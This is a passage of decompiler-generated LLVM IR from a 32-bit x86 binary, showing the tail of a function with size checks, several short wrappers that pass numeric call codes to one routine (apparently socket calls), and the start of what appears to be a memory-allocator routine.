  %v0_804d608 = phi i32 [ %v2_804d5f8, %dec_label_pc_804d600 ], [ %v0_804d608.pre, %dec_label_pc_804d5ed ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804d5d1, align 4
  %tmp43 = icmp ult i32 %v0_804d608, 4
  br i1 %tmp43, label %dec_label_pc_804d895, label %dec_label_pc_804d617

dec_label_pc_804d617:                             ; preds = %dec_label_pc_804d604
  %v0_804d617 = load i32, i32* @ebx, align 4
  %v1_804d617 = add i32 %v0_804d617, -4
  store i32 %v1_804d617, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_804d617, 8
  br i1 %tmp44, label %dec_label_pc_804d895, label %dec_label_pc_804d623

dec_label_pc_804d623:                             ; preds = %dec_label_pc_804d617
  %v0_804d623 = load i32, i32* @ebp, align 4
  %v1_804d623 = add i32 %v0_804d623, 4
  store i32 %v1_804d623, i32* %edx.global-to-local, align 4
  %v1_804d626 = add i32 %v0_804d617, -12
  store i32 %v1_804d626, i32* %eax.global-to-local, align 4
  store i32 %v1_804d623, i32* %stack_var_-92, align 4
  %v3_804d62f = inttoptr i32 %v1_804d623 to i32*
  store i32 %v0_804d623, i32* %v3_804d62f, align 4
  %v0_804d632 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d632 = add i32 %v0_804d632, 4
  %v2_804d632 = inttoptr i32 %v1_804d632 to i32*
  store i32 0, i32* %v2_804d632, align 4
  %tmp45 = icmp ult i32 %v1_804d626, 32
  br i1 %tmp45, label %dec_label_pc_804d895, label %dec_label_pc_804d63f

dec_label_pc_804d63f:                             ; preds = %dec_label_pc_804d623
  %v0_804d63f = load i32, i32* @ebx, align 4
  %v1_804d63f = add i32 %v0_804d63f, -44
  store i32 %v1_804d63f, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_804d63f, 256
  br i1 %tmp46, label %dec_label_pc_804d895, label %dec_label_pc_804d652

dec_label_pc_804d652:                             ; preds = %dec_label_pc_804d63f
  %v0_804d652 = load i32, i32* @ebp, align 4
  %v1_804d652 = add i32 %v0_804d652, 12
  %v1_804d655 = add i32 %v0_804d652, 44
  store i32 %v1_804d655, i32* @edi, align 4
  store i32 %v1_804d655, i32* %stack_var_-108, align 4
  %v3_804d666 = inttoptr i32 %v1_804d655 to i8*
  %v4_804d666 = call i32 @function_804d1c0(i8* %v3_804d666, i32 %arg1, i32 %v1_804d63f)
  %v0_804d66b = load i32, i32* @edi, align 4
  %v1_804d66b = load i32, i32* @ebp, align 4
  %v2_804d66b = add i32 %v1_804d66b, 12
  %v3_804d66b = inttoptr i32 %v2_804d66b to i32*
  store i32 %v0_804d66b, i32* %v3_804d66b, align 4
  %v1_804d672 = add i32 %v0_804d652, 16
  %v2_804d672 = inttoptr i32 %v1_804d672 to i32*
  store i32 0, i32* %v2_804d672, align 4
  %v2_804d679 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804d679, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804d67b = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804d680 = inttoptr i32 %arg1 to i8*
  %v3_804d680 = call i32 @function_80507cc(i8* %v2_804d680, i32 %v0_804d67b)
  store i32 %v3_804d680, i32* %eax.global-to-local, align 4
  %v1_804d688 = icmp eq i32 %v3_804d680, 0
  br i1 %v1_804d688, label %dec_label_pc_804d6c4, label %dec_label_pc_804d68c

dec_label_pc_804d68c:                             ; preds = %dec_label_pc_804d652
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804d690 = load i32, i32* @edi, align 4
  store i32 %v0_804d690, i32* %arg2, align 4
  %v1_804d692 = add i32 %tmp18, 8
  %v2_804d692 = inttoptr i32 %v1_804d692 to i32*
  store i32 2, i32* %v2_804d692, align 4
  %v0_804d699 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d699 = add i32 %v0_804d699, 12
  %v2_804d699 = inttoptr i32 %v1_804d699 to i32*
  store i32 4, i32* %v2_804d699, align 4
  %v2_804d6a0 = load i32, i32* %stack_var_-92, align 4
  %v1_804d6a3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d6a3 = add i32 %v1_804d6a3, 16
  %v3_804d6a3 = inttoptr i32 %v2_804d6a3 to i32*
  store i32 %v2_804d6a0, i32* %v3_804d6a3, align 4
  %v1_804d6aa = load i32, i32* %edx.global-to-local, align 4
  %v2_804d6aa = add i32 %v1_804d6aa, 4
  %v3_804d6aa = inttoptr i32 %v2_804d6aa to i32*
  store i32 %v1_804d652, i32* %v3_804d6aa, align 4
  %v0_804d6b1 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804d6b1, i32* %v1_804d583, align 4
  store i32 0, i32* %v1_804d5d1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d89a

dec_label_pc_804d6c4:                             ; preds = %dec_label_pc_804d652
  %v0_804d6c4 = call i32 @function_8050fb4()
  store i32 %v0_804d6c4, i32* @eax, align 4
  %v2_804d6d4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804d6d4, i32* @ebx, align 4
  store i32 %v2_804d6d4, i32* %stack_var_-108, align 4
  %v2_804d6d9 = call i32 @function_804f2ae(i32 %v2_804d6d4, i32 134541995)
  store i32 %v2_804d6d9, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* %stack_var_-108, align 4
  %v1_804d6e5 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8056090.137 to i32))
  store i32 ptrtoint (i32* @global_var_8056090.137 to i32), i32* @ecx, align 4
  store i32 134541995, i32* @eax, align 4
  store i32 %v2_804d6d4, i32* %stack_var_-108, align 4
  %v0_804d6ef = load i32, i32* @global_var_8058d74.138, align 4
  store i32 %v0_804d6ef, i32* @esi, align 4
  %v2_804d6f5 = call i32 @function_804f2ae(i32 %v2_804d6d4, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804d710 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804d715 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d715, i32* %eax.global-to-local, align 4
  store i32 %v2_804d715, i32* %stack_var_-108, align 4
  %v0_804d71f = load i32, i32* @esi, align 4
  %v7_804d726 = call i32 @function_8050860(i8* %v2_804d680, i32 1, i32 %v0_804d71f, i32 ptrtoint (i32* @global_var_8058d68.139 to i32), i32 %v2_804d715, i32 %v2_804d710)
  store i32 %v7_804d726, i32* %eax.global-to-local, align 4
  %v2_804d72e = icmp slt i32 %v7_804d726, 0
  %v1_804d730 = icmp eq i1 %v2_804d72e, false
  br i1 %v1_804d730, label %dec_label_pc_804d746, label %dec_label_pc_804d732

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d6c4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804d5d1, align 4
  br label %dec_label_pc_804d89a

dec_label_pc_804d746:                             ; preds = %dec_label_pc_804d6c4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804d759 = icmp ugt i32 %v1_804d63f, 256
  %v15_804d759 = icmp eq i32 %v0_804d63f, 300
  %v2_804d75d = or i1 %v15_804d759, %v10_804d759
  br i1 %v2_804d75d, label %dec_label_pc_804d7f8, label %dec_label_pc_804d75f

dec_label_pc_804d75f:                             ; preds = %dec_label_pc_804d746
  %v3_804d762 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804d762, i32* %stack_var_-108, align 4
  %v1_804d766 = call i32 @function_804e725(i32 %v3_804d762)
  store i32 %v1_804d766, i32* %eax.global-to-local, align 4
  store i32 %v3_804d762, i32* @edi, align 4
  %v3_804d76c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d76c, i32* %stack_var_-108, align 4
  %v1_804d770 = call i32 @function_804e725(i32 %v3_804d76c)
  store i32 -1, i32* %v1_804d5d1, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d870

dec_label_pc_804d7f8:                             ; preds = %dec_label_pc_804d746
  %v3_804d7fd.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804d801.pre = load i32, i32* @edi, align 4
  store i32 %v0_804d801.pre, i32* %stack_var_-108, align 4
  %v3_804d802 = inttoptr i32 %v0_804d801.pre to i8*
  %v4_804d802 = call i32 @function_804d1c0(i8* %v3_804d802, i32 %v3_804d7fd.pre, i32 %v1_804d63f)
  store i32 %v4_804d802, i32* %eax.global-to-local, align 4
  %v3_804d808 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804d808, i32* %stack_var_-108, align 4
  %v1_804d80c = call i32 @function_804e725(i32 %v3_804d808)
  store i32 %v1_804d80c, i32* %eax.global-to-local, align 4
  %v12_804d814 = icmp eq i32 %tmp10, 1
  %v1_804d819 = icmp eq i1 %v12_804d814, false
  br i1 %v1_804d819, label %dec_label_pc_804d875, label %dec_label_pc_804d81b

dec_label_pc_804d81b:                             ; preds = %dec_label_pc_804d7f8
  %v0_804d81b = load i32, i32* @edx, align 4
  %v0_804d822 = load i32, i32* @ebp, align 4
  store i32 %v0_804d822, i32* %stack_var_-108, align 4
  %v3_804d823 = inttoptr i32 %tmp to i16*
  %v4_804d823 = call i32 @function_804d150(i16* %v3_804d823, i32 4, i32 %v0_804d81b)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804d82c = load i32, i32* @edi, align 4
  store i32 %v0_804d82c, i32* %arg2, align 4
  %v1_804d82e = add i32 %tmp18, 8
  %v2_804d82e = inttoptr i32 %v1_804d82e to i32*
  store i32 2, i32* %v2_804d82e, align 4
  %v0_804d835 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d835 = add i32 %v0_804d835, 12
  %v2_804d835 = inttoptr i32 %v1_804d835 to i32*
  store i32 4, i32* %v2_804d835, align 4
  %v3_804d83c = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804d83c, i32* %edx.global-to-local, align 4
  %v1_804d840 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d840 = add i32 %v1_804d840, 16
  %v3_804d840 = inttoptr i32 %v2_804d840 to i32*
  store i32 %v3_804d83c, i32* %v3_804d840, align 4
  %v1_804d847 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d847 = add i32 %v1_804d847, 4
  %v3_804d847 = inttoptr i32 %v2_804d847 to i32*
  store i32 %v1_804d652, i32* %v3_804d847, align 4
  %v2_804d84a = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804d84a, i32* %eax.global-to-local, align 4
  %v3_804d84b = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d84b, i32* %stack_var_-108, align 4
  %v1_804d84f = call i32 @function_804e725(i32 %v3_804d84b)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804d583, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d5d1, align 4
  br label %dec_label_pc_804d870

dec_label_pc_804d870:                             ; preds = %dec_label_pc_804d875, %dec_label_pc_804d75f, %dec_label_pc_804d81b
  br label %dec_label_pc_804d89a

dec_label_pc_804d875:                             ; preds = %dec_label_pc_804d7f8
  %v3_804d878 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d878, i32* %stack_var_-108, align 4
  %v1_804d87c = call i32 @function_804e725(i32 %v3_804d878)
  store i32 1, i32* %v1_804d5d1, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d870

dec_label_pc_804d895:                             ; preds = %dec_label_pc_804d63f, %dec_label_pc_804d623, %dec_label_pc_804d617, %dec_label_pc_804d604, %dec_label_pc_804d5f8
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d89a

dec_label_pc_804d89a:                             ; preds = %dec_label_pc_804d5e4, %dec_label_pc_804d5dd, %dec_label_pc_804d599, %dec_label_pc_804d570, %dec_label_pc_804d870, %dec_label_pc_804d732, %dec_label_pc_804d68c, %dec_label_pc_804d895
  store i32 %v0_804d573, i32* @ebx, align 4
  store i32 %v0_804d572, i32* @esi, align 4
  store i32 %v0_804d571, i32* @edi, align 4
  store i32 %v0_804d570, i32* @ebp, align 4
  %v0_804d8a1 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804d8a1

; uselistorder directives
  uselistorder i32 %v2_804d6d4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804d655, { 1, 0, 2 }
  uselistorder i32 %v1_804d652, { 1, 0 }
  uselistorder i32 %v1_804d63f, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d608.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804d5f3, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804d5d1, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804d5d1, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804d583, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804d89a, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804d870, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d604, { 1, 0 }
}

define i32 @function_804d8a4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d8a4:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d8bf = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d8c6 = call i32 @function_804f5f8(i32 5, i32 %v2_804d8bf)
  ret i32 %v2_804d8c6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d8d0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d8d0:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d8eb = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d8f2 = call i32 @function_804f5f8(i32 2, i32 %v2_804d8eb)
  ret i32 %v2_804d8f2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d8fc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d8fc:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d917 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d91e = call i32 @function_804f5f8(i32 3, i32 %v2_804d917)
  ret i32 %v2_804d91e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d928(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d928:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804d93b = ptrtoint i32* %stack_var_-8 to i32
  %v2_804d942 = call i32 @function_804f5f8(i32 4, i32 %v2_804d93b)
  ret i32 %v2_804d942

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_804d94c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804d94c:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804d96f = ptrtoint i32* %stack_var_-16 to i32
  %v2_804d976 = call i32 @function_804f5f8(i32 10, i32 %v2_804d96f)
  ret i32 %v2_804d976

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804d980(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_804d980:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804d9b3 = ptrtoint i32* %stack_var_-24 to i32
  %v2_804d9ba = call i32 @function_804f5f8(i32 11, i32 %v2_804d9b3)
  ret i32 %v2_804d9ba

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_804d9c4() local_unnamed_addr {
dec_label_pc_804d9c4:
  %stack_var_-20 = alloca i32, align 4
  %v2_804d9ef = ptrtoint i32* %stack_var_-20 to i32
  %v2_804d9f6 = call i32 @function_804f5f8(i32 14, i32 %v2_804d9ef)
  ret i32 %v2_804d9f6
}

define i32 @function_804da00(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804da00:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804da1b = ptrtoint i32* %stack_var_-12 to i32
  %v2_804da22 = call i32 @function_804f5f8(i32 1, i32 %v2_804da1b)
  ret i32 %v2_804da22

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804da2c() local_unnamed_addr {
dec_label_pc_804da2c:
  %v0_804da2c = load i32, i32* @eax, align 4
  %v6_804da3f = icmp ugt i32 %v0_804da2c, 16777215
  br i1 %v6_804da3f, label %dec_label_pc_804da50, label %dec_label_pc_804da41

dec_label_pc_804da41:                             ; preds = %dec_label_pc_804da2c
  %tmp = icmp ult i32 %v0_804da2c, 256
  %v2_804da2f = udiv i32 %v0_804da2c, 256
  %v2_804da41 = call i32 @llvm.ctlz.i32(i32 %v2_804da2f, i1 true)
  %v3_804da41 = xor i32 %v2_804da41, 31
  %v5_804da41 = select i1 %tmp, i32 95, i32 %v3_804da41
  %v1_804da44 = add nuw nsw i32 %v5_804da41, 6
  store i32 %v1_804da44, i32* @ecx, align 4
  %v2_804da47 = urem i32 %v1_804da44, 32
  %v4_804da47 = icmp eq i32 %v2_804da47, 0
  br i1 %v4_804da47, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804da41
  %v5_804da47 = lshr i32 %v0_804da2c, %v2_804da47
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804da41, %bb
  %v0_804da49 = phi i32 [ %v0_804da2c, %dec_label_pc_804da41 ], [ %v5_804da47, %bb ]
  %v1_804da49 = urem i32 %v0_804da49, 4
  %v2_804da4c = mul nuw nsw i32 %v5_804da41, 4
  %v3_804da4c = or i32 %v1_804da49, 32
  %v4_804da4c = add nuw nsw i32 %v3_804da4c, %v2_804da4c
  br label %dec_label_pc_804da50

dec_label_pc_804da50:                             ; preds = %dec_label_pc_804da2c, %bb4
  %v0_804da51 = phi i32 [ 95, %dec_label_pc_804da2c ], [ %v4_804da4c, %bb4 ]
  ret i32 %v0_804da51

; uselistorder directives
  uselistorder i32 %v2_804da47, { 1, 0 }
  uselistorder i32 %v0_804da2c, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804da50, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_804da52(i32 %arg1) local_unnamed_addr {
dec_label_pc_804da52:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804da52 = load i32, i32* @ebp, align 4
  %v0_804da53 = load i32, i32* @edi, align 4
  %v0_804da54 = load i32, i32* @esi, align 4
  %v0_804da55 = load i32, i32* @ebx, align 4
  store i32 %v0_804da55, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804da67 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804da67, i32* @eax, align 4
  store i32 %v2_804da67, i32* %stack_var_-92, align 4
  %v2_804da6c = call i32 @function_804f2ae(i32 %v2_804da67, i32 134541995)
  store i32 %v2_804da6c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055f70.140 to i32), i32* %stack_var_-92, align 4
  %v1_804da78 = call i32 @function_804f2ab(i32 ptrtoint (i32* @global_var_8055f70.140 to i32))
  store i32 %v1_804da78, i32* %eax.global-to-local, align 4
  %v0_804da80 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804da80, -32
  br i1 %tmp125, label %dec_label_pc_804da97, label %dec_label_pc_804da85

dec_label_pc_804da85:                             ; preds = %dec_label_pc_804da52
  %v0_804da85 = load i32, i32* %stack_var_-92, align 4
  %v1_804da85 = call i32 @function_804b774(i32 %v0_804da85)
  store i32 %v1_804da85, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804da8c = inttoptr i32 %v1_804da85 to i32*
  store i32 12, i32* %v1_804da8c, align 4
  br label %dec_label_pc_804e1bc

dec_label_pc_804da97:                             ; preds = %dec_label_pc_804da52
  %v1_804da97 = add i32 %v0_804da80, 11
  %tmp126 = icmp ult i32 %v1_804da97, 16
  br i1 %tmp126, label %dec_label_pc_804daae, label %dec_label_pc_804daa7

dec_label_pc_804daa7:                             ; preds = %dec_label_pc_804da97
  %v1_804daa7 = and i32 %v1_804da97, -8
  br label %dec_label_pc_804daae

dec_label_pc_804daae:                             ; preds = %dec_label_pc_804da97, %dec_label_pc_804daa7
  %storemerge136 = phi i32 [ %v1_804daa7, %dec_label_pc_804daa7 ], [ %v1_804da97, %dec_label_pc_804da97 ]
  %v1_804de46 = phi i32 [ %v1_804daa7, %dec_label_pc_804daa7 ], [ 16, %dec_label_pc_804da97 ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804daae = load i8, i8* @global_var_80589e0.141, align 1
  %v1_804daae = sext i8 %v0_804daae to i32
  store i32 %v1_804daae, i32* @ebx, align 4
  %v3_804dab4 = urem i8 %v0_804daae, 2
  %v4_804dab4 = icmp eq i8 %v3_804dab4, 0
  %v1_804dab7 = icmp eq i1 %v4_804dab4, false
  br i1 %v1_804dab7, label %dec_label_pc_804dad6, label %dec_label_pc_804dab9

dec_label_pc_804dab9:                             ; preds = %dec_label_pc_804daae
  %v2_804dab9 = icmp eq i8 %v0_804daae, 0
  %v1_804dabb = icmp eq i1 %v2_804dab9, false
  br i1 %v1_804dabb, label %dec_label_pc_804ddb1, label %dec_label_pc_804dac1

dec_label_pc_804dac1:                             ; preds = %dec_label_pc_804dab9
  store i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32* %stack_var_-92, align 4
  %v2_804dac9 = call i32 @function_804e57d(i32* bitcast (i8* @global_var_80589e0.141 to i32*))
  store i32 %v2_804dac9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ddb1

dec_label_pc_804dad6:                             ; preds = %dec_label_pc_804daae
  %v11_804dad6 = trunc i32 %v1_804de46 to i8
  %v8_804dada = icmp ugt i8 %v11_804dad6, %v0_804daae
  br i1 %v8_804dada, label %dec_label_pc_804daf7, label %dec_label_pc_804dadc

dec_label_pc_804dadc:                             ; preds = %dec_label_pc_804dad6
  %v2_804dae0 = udiv i32 %v1_804de46, 2
  store i32 %v2_804dae0, i32* %eax.global-to-local, align 4
  %v1_804dae2 = add i32 %v2_804dae0, ptrtoint (i8* @global_var_80589e0.141 to i32)
  store i32 %v1_804dae2, i32* @ecx, align 4
  %v1_804dae8 = add i32 %v2_804dae0, add (i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32 -4)
  %v2_804dae8 = inttoptr i32 %v1_804dae8 to i32*
  %v3_804dae8 = load i32, i32* %v2_804dae8, align 4
  store i32 %v3_804dae8, i32* @edx, align 4
  %v1_804daeb = icmp eq i32 %v3_804dae8, 0
  br i1 %v1_804daeb, label %dec_label_pc_804daf7, label %dec_label_pc_804daef

dec_label_pc_804daef:                             ; preds = %dec_label_pc_804dadc
  %v1_804daef = add i32 %v3_804dae8, 8
  %v2_804daef = inttoptr i32 %v1_804daef to i32*
  %v3_804daef = load i32, i32* %v2_804daef, align 4
  store i32 %v3_804daef, i32* %eax.global-to-local, align 4
  store i32 %v3_804daef, i32* %v2_804dae8, align 4
  br label %dec_label_pc_804db30

dec_label_pc_804daf7:                             ; preds = %dec_label_pc_804dadc, %dec_label_pc_804dad6
  %v8_804daf7 = icmp ult i32 %v1_804de46, 255
  %v6_804daff = icmp ugt i32 %v1_804de46, 255
  store i32 %v1_804de46, i32* @eax, align 4
  br i1 %v6_804daff, label %dec_label_pc_804db38, label %dec_label_pc_804db01

dec_label_pc_804db01:                             ; preds = %dec_label_pc_804daf7
  %v2_804db05 = udiv i32 %v1_804de46, 8
  store i32 %v2_804db05, i32* %eax.global-to-local, align 4
  %v1_804db0c = mul nuw i32 %v2_804db05, 8
  %v2_804db0c = add i32 %v1_804db0c, ptrtoint (i32* @global_var_8058a0c.142 to i32)
  store i32 %v2_804db0c, i32* @ecx, align 4
  %v1_804db13 = add i32 %v1_804db0c, add (i32 ptrtoint (i32* @global_var_8058a0c.142 to i32), i32 12)
  %v2_804db13 = inttoptr i32 %v1_804db13 to i32*
  %v3_804db13 = load i32, i32* %v2_804db13, align 4
  store i32 %v3_804db13, i32* @edx, align 4
  %v12_804db16 = icmp eq i32 %v3_804db13, %v2_804db0c
  br i1 %v12_804db16, label %dec_label_pc_804dc34.preheader, label %dec_label_pc_804db1e

dec_label_pc_804db1e:                             ; preds = %dec_label_pc_804db01
  store i32 %v1_804de46, i32* %ebx.global-to-local, align 4
  %v1_804db22 = add i32 %v3_804db13, 12
  %v2_804db22 = inttoptr i32 %v1_804db22 to i32*
  %v3_804db22 = load i32, i32* %v2_804db22, align 4
  store i32 %v3_804db22, i32* %eax.global-to-local, align 4
  store i32 %v3_804db22, i32* %v2_804db13, align 4
  %v0_804db28 = load i32, i32* @edx, align 4
  %v1_804db28 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804db28 = add i32 %v0_804db28, 4
  %v3_804db28 = add i32 %v2_804db28, %v1_804db28
  %v4_804db28 = inttoptr i32 %v3_804db28 to i32*
  %v5_804db28 = load i32, i32* %v4_804db28, align 4
  %v6_804db28 = or i32 %v5_804db28, 1
  store i32 %v6_804db28, i32* %v4_804db28, align 4
  %v0_804db2d = load i32, i32* @ecx, align 4
  %v1_804db2d = load i32, i32* %eax.global-to-local, align 4
  %v2_804db2d = add i32 %v1_804db2d, 8
  %v3_804db2d = inttoptr i32 %v2_804db2d to i32*
  store i32 %v0_804db2d, i32* %v3_804db2d, align 4
  br label %dec_label_pc_804db30

dec_label_pc_804db30:                             ; preds = %dec_label_pc_804decd, %dec_label_pc_804dedf, %dec_label_pc_804daef, %dec_label_pc_804db1e
  %v0_804db30 = load i32, i32* @edx, align 4
  %v1_804db30 = add i32 %v0_804db30, 8
  store i32 %v1_804db30, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e1ab

dec_label_pc_804db38:                             ; preds = %dec_label_pc_804daf7
  %v0_804db3c = call i32 @function_804da2c()
  store i32 %v0_804db3c, i32* %eax.global-to-local, align 4
  %v3_804db41 = and i8 %v0_804daae, 2
  %v4_804db41 = icmp eq i8 %v3_804db41, 0
  %v6_804db41 = zext i8 %v3_804db41 to i32
  %v9_804db41 = and i32 %v1_804daae, -256
  %v10_804db41 = or i32 %v9_804db41, %v6_804db41
  store i32 %v10_804db41, i32* @ebx, align 4
  br i1 %v4_804db41, label %dec_label_pc_804dc34.preheader, label %dec_label_pc_804db4e

dec_label_pc_804db4e:                             ; preds = %dec_label_pc_804db38
  store i32 ptrtoint (i8* @global_var_80589e0.141 to i32), i32* %stack_var_-92, align 4
  %v2_804db56 = call i32 @function_804e57d(i32* bitcast (i8* @global_var_80589e0.141 to i32*))
  store i32 %v2_804db56, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc34.preheader

dec_label_pc_804dc34.preheader:                   ; preds = %dec_label_pc_804db4e, %dec_label_pc_804db01, %dec_label_pc_804db38
  %stack_var_-40.0.ph = phi i32 [ %v2_804db05, %dec_label_pc_804db01 ], [ %v0_804db3c, %dec_label_pc_804db4e ], [ %v0_804db3c, %dec_label_pc_804db38 ]
  %v1_804db8a = add i32 %v1_804de46, 16
  %v0_804dc34107 = load i32, i32* @global_var_8058a20.145, align 32
  store i32 %v0_804dc34107, i32* @ebp, align 4
  %v9_804dc3a109 = icmp eq i32 %v0_804dc34107, 134580756
  %v1_804dc40110 = icmp eq i1 %v9_804dc3a109, false
  br i1 %v1_804dc40110, label %dec_label_pc_804db63, label %dec_label_pc_804dc46

dec_label_pc_804db63:                             ; preds = %dec_label_pc_804dc34.preheader, %bb84
  %v0_804dc34111 = phi i32 [ %v0_804dc34, %bb84 ], [ %v0_804dc34107, %dec_label_pc_804dc34.preheader ]
  %v1_804db63 = add i32 %v0_804dc34111, 4
  %v2_804db63 = inttoptr i32 %v1_804db63 to i32*
  %v3_804db63 = load i32, i32* %v2_804db63, align 4
  %v1_804db66 = add i32 %v0_804dc34111, 12
  %v2_804db66 = inttoptr i32 %v1_804db66 to i32*
  %v3_804db66 = load i32, i32* %v2_804db66, align 4
  store i32 %v3_804db66, i32* @edx, align 4
  %v1_804db69 = and i32 %v3_804db63, -4
  store i32 %v1_804db69, i32* @edi, align 4
  br i1 %v6_804daff, label %dec_label_pc_804db95, label %dec_label_pc_804db76

dec_label_pc_804db76:                             ; preds = %dec_label_pc_804db63
